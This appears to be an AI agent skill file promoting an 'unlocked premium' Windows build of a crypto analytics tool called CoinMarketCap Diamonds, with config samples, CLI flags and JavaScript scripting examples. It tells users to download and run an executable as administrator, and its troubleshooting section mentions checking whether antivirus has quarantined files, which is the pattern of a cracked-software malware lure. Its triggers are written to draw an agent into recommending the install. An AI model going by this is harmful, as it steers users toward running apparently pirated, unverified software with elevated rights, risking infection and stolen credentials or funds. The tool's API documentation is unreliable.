---
name: coinmarketcap-diamonds-premium-analytics
description: Unlocked premium CoinMarketCap Diamonds build for cryptocurrency trading analytics and blockchain data visualization on Windows
triggers:
  - how do I use CoinMarketCap Diamonds premium features
  - analyze cryptocurrency trading data with Diamonds
  - set up CoinMarketCap premium analytics tool
  - configure Diamonds for crypto market analysis
  - access pro features in CoinMarketCap Diamonds
  - troubleshoot CoinMarketCap Diamonds installation
  - extract blockchain analytics with Diamonds
  - integrate CoinMarketCap API with Diamonds
---

# CoinMarketCap Diamonds Premium Analytics

> Skill by [ara.so](https://ara.so) — Data Skills collection.

## Overview

CoinMarketCap Diamonds is a premium Windows application that provides advanced cryptocurrency trading analytics and blockchain data visualization. This build includes unlocked pro features for comprehensive market analysis, portfolio tracking, and real-time trading insights.

**Key Features:**
- Real-time cryptocurrency price tracking and alerts
- Advanced technical analysis and charting tools
- Portfolio management and performance analytics
- Premium API access to CoinMarketCap data
- Custom indicators and trading signals
- Multi-exchange data aggregation

## Installation

### System Requirements
- Windows 10/11 (64-bit)
- .NET Framework 4.8 or higher
- Minimum 4GB RAM
- Active internet connection

### Download and Setup

1. Download the latest release from the repository
2. Extract the archive to your preferred installation directory (e.g., `C:\Program Files\CoinMarketCap-Diamonds\`)
3. Run `CoinMarketCapDiamonds.exe` as administrator for first-time setup
4. Configure API credentials through the settings panel

### Environment Configuration

Create a `.env` file or set system environment variables:

```env
COINMARKETCAP_API_KEY=your_api_key_here
DIAMONDS_DATA_PATH=C:\Users\YourUser\AppData\Local\Diamonds\data
DIAMONDS_CACHE_SIZE=1024
DIAMONDS_UPDATE_INTERVAL=60
```

## Configuration

### Initial Setup

The application uses a `config.json` file located in the installation directory:

```json
{
  "api": {
    "provider": "coinmarketcap",
    "apiKey": "${COINMARKETCAP_API_KEY}",
    "rateLimit": 30,
    "timeout": 10000
  },
  "analytics": {
    "enablePremiumFeatures": true,
    "dataRetention": 90,
    "realTimeUpdates": true
  },
  "ui": {
    "theme": "dark",
    "defaultView": "dashboard",
    "chartRefreshRate": 5000
  },
  "alerts": {
    "enabled": true,
    "soundNotifications": true,
    "emailNotifications": false
  }
}
```

### Premium Features Configuration

Enable specific pro features by editing `premium.config`:

```json
{
  "features": {
    "advancedCharting": true,
    "customIndicators": true,
    "multiExchange": true,
    "historicalDataAccess": true,
    "exportCapabilities": true,
    "apiUnlimited": true
  },
  "limits": {
    "watchlistSize": -1,
    "portfolios": -1,
    "alerts": -1,
    "apiCallsPerDay": -1
  }
}
```

## Core Features & Usage

### Command-Line Interface

The application supports CLI commands for automation and scripting:

```bash
# Launch with specific profile
CoinMarketCapDiamonds.exe --profile trading

# Export data to CSV
CoinMarketCapDiamonds.exe --export portfolio --format csv --output C:\exports\portfolio.csv

# Update market data
CoinMarketCapDiamonds.exe --update-cache --silent

# Run analytics script
CoinMarketCapDiamonds.exe --script analytics.js --output report.html
```

### Scripting & Automation

Create custom analytics scripts using the built-in JavaScript engine:

```javascript
// analytics.js - Custom trading signal generator

// Access market data
const btc = Diamonds.getCrypto('BTC');
const eth = Diamonds.getCrypto('ETH');

// Calculate custom indicator
function calculateRSI(symbol, period = 14) {
  const prices = Diamonds.getPriceHistory(symbol, period * 2);
  let gains = 0, losses = 0;
  
  for (let i = 1; i < prices.length; i++) {
    const change = prices[i] - prices[i - 1];
    if (change > 0) gains += change;
    else losses += Math.abs(change);
  }
  
  const avgGain = gains / period;
  const avgLoss = losses / period;
  const rs = avgGain / avgLoss;
  
  return 100 - (100 / (1 + rs));
}

// Generate signals
const btcRSI = calculateRSI('BTC', 14);
const ethRSI = calculateRSI('ETH', 14);

if (btcRSI < 30) {
  Diamonds.alert('BTC oversold - RSI: ' + btcRSI.toFixed(2), 'BUY_SIGNAL');
}

if (ethRSI > 70) {
  Diamonds.alert('ETH overbought - RSI: ' + ethRSI.toFixed(2), 'SELL_SIGNAL');
}

// Export results
Diamonds.export({
  timestamp: Date.now(),
  signals: [
    { symbol: 'BTC', rsi: btcRSI, signal: btcRSI < 30 ? 'BUY' : btcRSI > 70 ? 'SELL' : 'HOLD' },
    { symbol: 'ETH', rsi: ethRSI, signal: ethRSI < 30 ? 'BUY' : ethRSI > 70 ? 'SELL' : 'HOLD' }
  ]
}, 'json');
```

### Portfolio Analysis

```javascript
// portfolio-analysis.js

// Load portfolio
const portfolio = Diamonds.getPortfolio('main');

// Calculate metrics
const totalValue = portfolio.getTotalValue('USD');
const dailyChange = portfolio.getDailyChange();
const profitLoss = portfolio.getProfitLoss();

// Get top performers
const topGainers = portfolio.getAssets()
  .sort((a, b) => b.change24h - a.change24h)
  .slice(0, 5);

// Generate report
const report = {
  timestamp: new Date().toISOString(),
  summary: {
    totalValue: totalValue,
    dailyChangePercent: dailyChange.percent,
    dailyChangeValue: dailyChange.value,
    totalProfitLoss: profitLoss,
    assetCount: portfolio.getAssets().length
  },
  topPerformers: topGainers.map(asset => ({
    symbol: asset.symbol,
    holdings: asset.amount,
    value: asset.currentValue,
    change24h: asset.change24h,
    profitLoss: asset.profitLoss
  }))
};

// Save report
Diamonds.saveReport(report, 'portfolio-daily-' + Date.now() + '.json');
Diamonds.log('Portfolio analysis complete: ' + JSON.stringify(report.summary));
```

### API Integration

Access CoinMarketCap data programmatically:

```javascript
// api-integration.js

// Configure API client
const api = Diamonds.API.configure({
  apiKey: Diamonds.env('COINMARKETCAP_API_KEY'),
  sandbox: false,
  version: 'v2'
});

// Fetch cryptocurrency listings
async function getTopCryptos(limit = 100) {
  const response = await api.cryptocurrency.listingsLatest({
    limit: limit,
    convert: 'USD',
    sort: 'market_cap'
  });
  
  return response.data;
}

// Get historical data
async function getHistoricalQuotes(symbol, timeStart, timeEnd) {
  const response = await api.cryptocurrency.quotesHistorical({
    symbol: symbol,
    time_start: timeStart,
    time_end: timeEnd,
    interval: '1d'
  });
  
  return response.data;
}

// Market dominance analysis
async function analyzeMarketDominance() {
  const cryptos = await getTopCryptos(20);
  const totalMarketCap = cryptos.reduce((sum, c) => sum + c.quote.USD.market_cap, 0);
  
  const dominance = cryptos.map(crypto => ({
    symbol: crypto.symbol,
    name: crypto.name,
    marketCap: crypto.quote.USD.market_cap,
    dominancePercent: (crypto.quote.USD.market_cap / totalMarketCap * 100).toFixed(2)
  }));
  
  Diamonds.visualize('marketDominance', dominance);
  return dominance;
}

// Execute analysis
analyzeMarketDominance().then(data => {
  Diamonds.log('Market dominance analysis complete');
});
```

## Common Patterns

### Real-Time Price Monitoring

```javascript
// price-monitor.js

// Subscribe to price updates
Diamonds.subscribe('price:BTC', (data) => {
  console.log(`BTC Price: $${data.price.toFixed(2)} | Change: ${data.change24h.toFixed(2)}%`);
  
  // Check thresholds
  if (data.price > 50000 && !Diamonds.getFlag('btc_50k_alert')) {
    Diamonds.alert('BTC crossed $50,000!', 'PRICE_MILESTONE');
    Diamonds.setFlag('btc_50k_alert', true);
  }
});

// Multi-symbol monitoring
const watchlist = ['BTC', 'ETH', 'BNB', 'ADA', 'SOL'];
watchlist.forEach(symbol => {
  Diamonds.subscribe(`price:${symbol}`, (data) => {
    if (Math.abs(data.change1h) > 5) {
      Diamonds.alert(`${symbol} moved ${data.change1h.toFixed(2)}% in 1 hour`, 'VOLATILITY');
    }
  });
});
```

### Data Export & Reporting

```javascript
// data-export.js

// Export market data
function exportMarketSnapshot() {
  const data = Diamonds.getMarketSnapshot(['BTC', 'ETH', 'BNB']);
  
  // CSV export
  Diamonds.export(data, {
    format: 'csv',
    filename: `market-snapshot-${Date.now()}.csv`,
    path: Diamonds.env('DIAMONDS_DATA_PATH')
  });
  
  // JSON export with metadata
  Diamonds.export({
    exportTime: new Date().toISOString(),
    source: 'CoinMarketCap',
    data: data
  }, {
    format: 'json',
    filename: `market-snapshot-${Date.now()}.json`,
    pretty: true
  });
}

// Scheduled exports
Diamonds.schedule('0 */6 * * *', exportMarketSnapshot); // Every 6 hours
```

### Custom Indicators

```javascript
// indicators.js

// Moving Average Convergence Divergence (MACD)
Diamonds.registerIndicator('MACD', function(symbol, fast = 12, slow = 26, signal = 9) {
  const prices = this.getPriceHistory(symbol, slow * 3);
  
  const emaFast = this.calculateEMA(prices, fast);
  const emaSlow = this.calculateEMA(prices, slow);
  const macdLine = emaFast.map((val, i) => val - emaSlow[i]);
  const signalLine = this.calculateEMA(macdLine, signal);
  const histogram = macdLine.map((val, i) => val - signalLine[i]);
  
  return {
    macd: macdLine[macdLine.length - 1],
    signal: signalLine[signalLine.length - 1],
    histogram: histogram[histogram.length - 1]
  };
});

// Use custom indicator
const btcMACD = Diamonds.indicators.MACD('BTC');
if (btcMACD.histogram > 0 && btcMACD.macd > btcMACD.signal) {
  Diamonds.alert('BTC MACD bullish crossover', 'TECHNICAL_SIGNAL');
}
```

## Troubleshooting

### Common Issues

**Application won't start:**
- Verify .NET Framework 4.8+ is installed
- Run as administrator
- Check antivirus hasn't quarantined files
- Review `logs/error.log` for startup errors

**API connection failures:**
```javascript
// Test API connectivity
Diamonds.API.test().then(result => {
  if (!result.success) {
    console.error('API Error:', result.error);
    // Check API key validity
    // Verify network connectivity
    // Check firewall settings
  }
});
```

**Premium features not accessible:**
- Verify `premium.config` exists and is properly formatted
- Check `enablePremiumFeatures: true` in `config.json`
- Restart application after configuration changes

**Data synchronization issues:**
```bash
# Clear cache and resync
CoinMarketCapDiamonds.exe --clear-cache
CoinMarketCapDiamonds.exe --sync-full
```

**High memory usage:**
- Reduce `DIAMONDS_CACHE_SIZE` in environment variables
- Decrease `dataRetention` days in config
- Limit number of active subscriptions

### Logging & Debugging

Enable detailed logging:

```json
{
  "logging": {
    "level": "debug",
    "file": "logs/diamonds-debug.log",
    "console": true,
    "includeTimestamps": true
  }
}
```

Access logs programmatically:

```javascript
// Enable debug mode
Diamonds.setLogLevel('debug');

// Custom logging
Diamonds.log('info', 'Custom message');
Diamonds.log('error', 'Error occurred', { context: 'data' });

// Export logs
Diamonds.exportLogs('logs-' + Date.now() + '.txt');
```

## Best Practices

1. **Secure API Keys**: Always use environment variables for sensitive credentials
2. **Rate Limiting**: Respect API rate limits to avoid throttling
3. **Error Handling**: Implement try-catch blocks in custom scripts
4. **Data Backups**: Regularly export portfolio and configuration data
5. **Performance**: Use caching for frequently accessed data
6. **Updates**: Keep the application updated for latest features and security patches
